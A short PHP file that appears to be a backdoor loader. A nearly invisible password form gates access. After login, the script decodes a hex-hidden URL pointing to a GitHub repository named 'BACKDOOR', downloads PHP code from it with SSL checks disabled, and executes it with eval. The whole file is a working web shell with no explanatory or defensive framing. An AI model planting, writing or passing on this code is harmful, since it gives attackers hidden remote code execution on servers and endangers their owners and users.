<?php
session_start();
$ea = '$2a$12$vvI7Qs/wdngvuKZJwbq73Otql4Uc5tz3d/8wqJPvtj3e3ZNAYkKcy'; 
if (!isset($_SESSION['logged_in'])) {
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 if (password_verify($_POST['pass'], $ea)) {
$_SESSION['logged_in'] = true;
 header("Location: " . $_SERVER['PHP_SELF']);
 exit;
 } else {
     $error = "X";
 }
 }
if (isset($error)) echo '<p style="color:red;">' . htmlspecialchars($error) . '</p>';
echo '<form method="post">
<style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style>
 <label><input type="password" name="pass"></label><br>
<input type="submit" value="">
';
 exit;
}
$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f486f6e657954656e6e65737365652f4241434b444f4f522f726566732f68656164732f6d61696e2f7468652d6f672e706870
';
$url = hex2bin($hexUrl);

$phpScript = @file_get_contents($url);
if ($phpScript === false && function_exists('curl_init')) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $phpScript = curl_exec($ch);
    curl_close($ch);
}

if ($phpScript !== false) {
    eval('?>' . $phpScript);
} else {
    die("x");
}
?>v
